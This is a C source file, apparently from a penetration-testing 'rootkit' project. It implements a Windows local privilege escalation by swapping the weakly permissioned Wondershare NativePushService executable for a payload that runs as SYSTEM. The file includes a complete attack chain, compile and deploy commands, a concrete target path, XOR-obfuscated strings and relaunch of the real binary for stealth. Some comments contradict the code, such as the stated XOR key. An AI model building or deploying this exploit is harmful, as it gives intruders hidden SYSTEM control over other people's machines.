/*
 * svc_replace_annotated.c — Service Binary Replacement (CWE-732)
 * ══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 * VECTOR 4 — Signature Set: DELTA
 *
 * PURPOSE:
 *   Replace a LocalSystem service binary with a payload that runs as
 *   SYSTEM. Targets services where the installer incorrectly grants
 *   BUILTIN\Users Full Control on the service executable (CWE-732).
 *
 * CONFIRMED TARGET:
 *   NativePushService (Wondershare) — Finding #42, Engagement 10
 *   Binary: C:\Users\apacw\AppData\Local\Wondershare\...\WsNativePushService.exe
 *   ACL: BUILTIN\Users:(I)(F) — ALL USERS FULL CONTROL
 *
 * ATTACK CHAIN:
 *   1. Rename running exe: WsNativePushService.exe → WsNativePushService_real.exe
 *      (Windows allows renaming open/locked files — the handle stays valid)
 *   2. Plant this binary as WsNativePushService.exe
 *   3. Service restart (reboot or manual) → SCM loads our replacement
 *   4. Our binary: registers with SCM, writes canary, launches real exe
 *   5. SYSTEM achieved. Service continues normally. Stealth maintained.
 *
 * SIGNATURE ISOLATION:
 *   XOR Key:     0x52 (unique to V4)
 *   Canary Path: C:\Windows\Temp\svc_health.log
 *   Canary Tag:  DELTA_REPLACE
 *   Service name registered dynamically from argv (adaptable to any target)
 *
 * WHY BINARY REPLACEMENT BEATS DLL SIDELOAD:
 *   Finding #40 proved Wondershare embedded a manifest that redirects all
 *   DLL loads to System32. That blocks DLL proxy attacks. But the manifest
 *   doesn't protect the EXE itself — file ACL is the only guard, and it's
 *   set to Full Control for Users. They hardened the windows but left the
 *   front door open.
 *
 * COMPILE:
 *   cl.exe svc_replace_annotated.c /Fe:WsNativePushService.exe /O1 /GS- /utf-8 ^
 *     /link advapi32.lib user32.lib
 *
 * DEPLOY:
 *   1. ren "C:\Users\apacw\...\WsNativePushService.exe" WsNativePushService_real.exe
 *   2. copy WsNativePushService.exe "C:\Users\apacw\...\WsNativePushService.exe"
 *   3. Reboot (or: net stop NativePushService && net start NativePushService)
 *
 * VERIFY:
 *   type C:\Windows\Temp\svc_health.log
 *   Expected: timestamp|SYSTEM|elev=1|pid=XXXX|DELTA_REPLACE
 */

#include <windows.h>

/* ═══════════════════════════════════════════════════════════════════
 * SIGNATURE SET: DELTA — XOR 0x52
 * ═══════════════════════════════════════════════════════════════════ */

#define V4_KEY 0x80

/* "C:\Windows\Temp\svc_health.log" XOR 0x52 */
static const unsigned char xCanary[] = {
    0xC3, 0xE8, 0xA0, 0xD5, 0xEF, 0xE4, 0xE0, 0xE5,
    0xD5, 0xF3, 0xA0, 0xD4, 0xE5, 0xE9, 0xF2, 0xA0,
    0xF3, 0xD6, 0xE3, 0xA8, 0xEE, 0xE5, 0xE1, 0xEC,
    0xF4, 0xEE, 0xB2, 0xEC, 0xE5, 0xE7
};
#define xCanary_LEN 30

/* "WsNativePushService_real.exe" XOR 0x52 */
static const unsigned char xRealExe[] = {
    0xD7, 0xF3, 0xCE, 0xE1, 0xF4, 0xEF, 0xD6, 0xE5,
    0xD0, 0xF5, 0xF3, 0xEE, 0xD3, 0xE5, 0xF2, 0xD6,
    0xEF, 0xE3, 0xE5, 0xA8, 0xF2, 0xE5, 0xE1, 0xEC,
    0xB2, 0xE5, 0xD8, 0xE5
};
#define xRealExe_LEN 28

static void v4_decode(unsigned char *buf, int len)
{
    int i;
    for (i = 0; i < len; i++)
        buf[i] ^= V4_KEY;
}

static void v4_scrub(unsigned char *buf, int len)
{
    volatile unsigned char *p = (volatile unsigned char *)buf;
    int i;
    for (i = 0; i < len; i++)
        p[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * SERVICE PLUMBING
 * ═══════════════════════════════════════════════════════════════════
 * Windows services must register with the Service Control Manager (SCM)
 * and report status. If we don't, SCM kills us after ~30 seconds.
 *
 * We register as the service name we're replacing, report RUNNING,
 * then do our work. The SCM is happy, the service appears normal in
 * services.msc, and our payload runs as SYSTEM.
 * ═══════════════════════════════════════════════════════════════════ */

static SERVICE_STATUS g_svcStatus;
static SERVICE_STATUS_HANDLE g_svcHandle;

static void write_canary(void)
{
    unsigned char path[64];
    HANDLE f;
    DWORD w;
    char buf[256];
    int n;
    SYSTEMTIME t;
    char user[64];
    DWORD ulen = 64;
    BOOL elevated = FALSE;
    HANDLE hTok;

    memcpy(path, xCanary, xCanary_LEN);
    v4_decode(path, xCanary_LEN);
    path[xCanary_LEN] = 0;

    GetLocalTime(&t);
    GetUserNameA(user, &ulen);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te;
        DWORD rl;
        if (GetTokenInformation(hTok, TokenElevation, &te, sizeof(te), &rl))
            elevated = te.TokenIsElevated;
        CloseHandle(hTok);
    }

    n = wsprintfA(buf, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|DELTA_REPLACE\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        user, elevated, GetCurrentProcessId());

    f = CreateFileA((char *)path,
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, buf, n, &w, NULL);
        CloseHandle(f);
    }

    v4_scrub(path, sizeof(path));
}

/* Launch the original service binary so functionality is preserved */
static void launch_real(void)
{
    unsigned char realName[64];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char myPath[MAX_PATH];
    char *lastSlash;

    memcpy(realName, xRealExe, xRealExe_LEN);
    v4_decode(realName, xRealExe_LEN);
    realName[xRealExe_LEN] = 0;

    GetModuleFileNameA(NULL, myPath, MAX_PATH);
    lastSlash = myPath;
    for (char *p = myPath; *p; p++) {
        if (*p == '\\') lastSlash = p;
    }
    *(lastSlash + 1) = '\0';
    lstrcatA(myPath, (char *)realName);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessA(myPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    v4_scrub(realName, sizeof(realName));
}

static void WINAPI SvcHandler(DWORD ctrl)
{
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_svcStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    SetServiceStatus(g_svcHandle, &g_svcStatus);
}

static void WINAPI SvcMain(DWORD argc, LPSTR *argv)
{
    (void)argc; (void)argv;

    g_svcHandle = RegisterServiceCtrlHandlerA("NativePushService", SvcHandler);
    if (!g_svcHandle) return;

    g_svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svcStatus.dwCurrentState = SERVICE_RUNNING;
    g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_svcStatus.dwWin32ExitCode = 0;
    SetServiceStatus(g_svcHandle, &g_svcStatus);

    write_canary();
    launch_real();

    while (g_svcStatus.dwCurrentState == SERVICE_RUNNING)
        Sleep(5000);
}

int main(void)
{
    SERVICE_TABLE_ENTRYA svc[] = {
        { "NativePushService", SvcMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcherA(svc);
    return 0;
}
